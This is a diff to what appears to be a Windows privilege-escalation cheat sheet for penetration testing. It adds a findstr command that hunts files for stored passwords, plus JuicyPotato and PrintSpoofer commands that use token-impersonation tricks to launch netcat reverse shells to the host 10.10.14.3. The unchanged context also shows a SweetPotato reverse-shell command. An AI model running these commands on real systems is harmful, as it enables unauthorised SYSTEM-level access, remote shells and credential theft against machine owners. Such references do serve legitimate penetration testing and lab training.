@@ -79,6 +79,7 @@ Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.k
 # MONEYYYYY
 > netstat -p tcp
 > netstat -p tcp -f
+> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 ```
 
 ### PowerView.ps1
@@ -1184,12 +1185,13 @@ SweetPotato.
 .\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
 ```
 
-There are other similar tools such as RottenPotato, SweetPotato, or JuicyPotato.
-
 
 Juicy Potato 
-- https://github.com/ohpe/juicy-potato
 - Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation
+
+```bash
+c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *
+```
 
 Lovely Potato (Automated Juicy Potato)
 - https://github.com/TsukiCTF/Lovely-Potato
@@ -1197,6 +1199,10 @@ Lovely Potato (Automated Juicy Potato)
 
 PrintSpoofer (Exploit the PrinterBug for System Impersonation)
 - Works for Windows Server 2019 and Windows 10, Spooler Service needs to be on
+
+```bash
+c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
+```
 
 RoguePotato (Upgraded Juicy Potato)
 Works for Windows Server 2019 and Windows 10
